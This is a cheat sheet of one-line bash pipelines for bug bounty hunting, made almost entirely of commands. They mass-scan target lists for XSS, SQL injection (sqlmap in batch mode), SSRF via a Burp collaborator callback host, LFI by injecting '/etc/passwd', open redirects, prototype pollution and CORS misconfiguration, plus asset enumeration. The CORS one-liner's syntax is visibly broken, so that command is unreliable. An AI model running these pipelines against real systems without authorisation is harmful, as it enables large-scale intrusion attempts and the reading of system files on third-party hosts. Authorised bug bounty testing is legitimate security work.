# Bug Bounty with One-Line Bash Scripts
&nbsp;

### Hunt XSS
```
cat targets.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
cat targets.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```
&nbsp;

### Hunt SQLi
```
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```
&nbsp;

### Hunt SSRF
```
findomain -t http://target.com -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```
&nbsp;

### Hunt LFI
```
gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
&nbsp;

### Hunt Open Redirect
```
gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
&nbsp;

### Hunt Prototype Pollution
```
subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
```
&nbsp;

### Hunt CORS:
```
gau http://vuln.target.com | while read url;do target=$(curl -s -I -H "Origin: https://evvil.com" -X GET $url) | if grep 'https://evvil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
&nbsp;

###  Extract .js
```
echo http://target.com | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
assetfinder http://vuln.target.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
```
&nbsp;

### Extract URLs from comment
```
cat targets.txt | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]'
```
&nbsp;

### Dump In-scope Assets from HackerOne
```
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type]
```
&nbsp;

### Find live host/domain/assets
```
subfinder -d http://vuln.target.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```
&nbsp;

### Screenshot
```
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```
&nbsp;
